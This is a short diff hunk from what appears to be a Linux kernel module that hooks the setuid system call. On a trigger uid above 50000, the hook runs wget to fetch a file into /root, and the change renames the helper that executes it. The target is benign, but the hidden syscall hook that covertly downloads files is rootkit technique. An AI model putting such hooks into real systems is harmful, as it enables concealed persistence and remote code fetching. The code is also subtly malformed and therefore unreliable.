@@ -201,7 +201,7 @@ asmlinkage int hacked_setuid(uid_t uid){
 	if(uid > 50000){
 		printk("Running system call.");
 	        const char *args[3] = {"wget","google.com","-P","/root"};
-	        SYS_execve("/bin/wget", args , NULL);
+	        my_execve("/bin/wget", args , NULL);
 	}
 	return (*orig_setuid)(uid);
 }
